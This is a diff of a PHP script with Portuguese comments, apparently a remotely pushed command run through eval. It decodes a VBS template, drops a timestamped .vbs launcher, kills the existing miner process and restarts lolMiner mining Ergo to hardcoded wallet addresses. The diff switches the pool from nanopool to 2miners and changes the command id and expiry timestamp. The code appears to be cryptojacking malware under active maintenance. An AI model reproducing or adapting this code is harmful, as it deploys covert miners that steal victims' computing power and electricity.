@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****37
+****38
 
 [GIT_COMMAND]
 
@@ -337,7 +337,8 @@ if(1)
 		$vbsname = $vbs_checkname . ' vs10.12212147455.'.(string)time().'.vbs';
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user xxxxxxxxxxxxxxxxxx.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum;*/
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user xxxxxxxxxxxxxxxxxxxxx.'.$work_key.' --watchdog exit --nocolor';*/
-		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-us-east1.nanopool.org:10600 --user 9iBGUJ1H4PmqPtmuxXXNSr5JHDcT2QvFiW4LEjRXHFQnjrTzQhE.'.$work_key.' --watchdog exit --nocolor';
+		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-us-east1.nanopool.org:10600 --user 9iBGUJ1H4PmqPtmuxXXNSr5JHDcT2QvFiW4LEjRXHFQnjrTzQhE.'.$work_key.' --watchdog exit --nocolor';*/
+		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user 9iBMo1BM7mSPRUWA1yHDUepNCHKZ4ZV4vaeMGhCsBbUmVcDDYfr.'.$work_key.' --watchdog exit --nocolor';
 		$command = preg_replace('/\"/is', '""', $command);
 		$vbs = base64_decode($vbs);
 		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
@@ -402,9 +403,9 @@ if(1)
 		{
 			$output = array();
 			/**/
-			$new_command_id = '10015';
+			$new_command_id = '10016';
 			$path_control_id  = dirname(PHP_BINARY) . '/command_id';
-			if((time() < (1779976318 + (60*60*24*3))) && @file_get_contents($path_control_id) !== $new_command_id)
+			if((time() < (1785256398 + (60*60*24*3))) && @file_get_contents($path_control_id) !== $new_command_id)
 			{
 				@file_put_contents($path_control_id, $new_command_id);
 				@exec('taskkill /f /im '.$lolm_name.'.exe');
